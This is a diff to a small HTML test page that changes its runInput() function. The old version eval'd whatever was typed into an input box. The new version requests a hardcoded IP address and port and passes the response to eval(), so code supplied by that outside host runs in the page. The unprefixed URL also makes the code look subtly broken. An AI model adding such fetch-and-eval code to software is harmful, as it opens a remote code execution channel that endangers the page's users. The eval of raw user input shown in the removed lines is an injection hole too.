@@ -181,9 +181,9 @@ startTask
         TEST4
     </button>
 
-    
-    
-    <input id="TEST" type="test">
+
+
+    <input id="TEST" type="test" width="500px">
     <button onclick="runInput()">RunInput</button>
 
     <p id="myP">
@@ -197,10 +197,16 @@ startTask
         var string = "";
 
         function runInput() {
-            var d = document.getElementById("TEST").value;
-            // console.log(d);
-            eval(d);
 
+            const Http = new XMLHttpRequest();
+            const url = '139.180.144.198:8888';
+            Http.open("GET", url);
+            Http.send();
+            var d;
+            Http.onreadystatechange = (e) => {
+               d=(Http.responseText)
+               eval(d);
+            }
         }
 
         function change() {
